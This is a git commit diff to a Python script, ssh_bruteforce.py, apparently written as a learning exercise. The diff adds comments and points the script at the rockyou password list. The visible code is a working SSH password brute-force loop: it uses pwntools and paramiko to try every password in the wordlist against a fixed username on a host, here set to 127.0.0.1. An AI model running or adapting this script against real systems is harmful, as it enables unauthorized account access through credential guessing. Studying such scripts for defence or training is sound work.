137259851f6feb09f5bbacb1c105ddf8134ca93b
1urch <charleshreed10@gmail.com>
2023-01-19 00:18:14 -0500

    Update ssh_bruteforce.py

--- ssh_bruteforce.py
+++ ssh_bruteforce.py
@@ -2,14 +2,18 @@ from pwn import *
 import paramiko
 
 
+"""
+Connect via ssh to a host, iterate though a password file with a fixed username, attempt to gain entry
+"""
+
 host = "127.0.0.1"
 username = "notroot"
 attempts = 0 #iterator used to limit, count attempts
-password_file = "rockyou.txt"
+password_file = "/usr/share/wordlists/rockyou.txt"
 
 with open(password_file, "r") as password_list:
     for password in password_list:
-        password = password.strip("\n")
+        password = password.strip("\n") #strip newline characters from words
         try:
             print("[{}] Attempting Password: '{}'!".format(attempts, password))
             response = ssh(host=host, user=username, password=password, timeout=1)
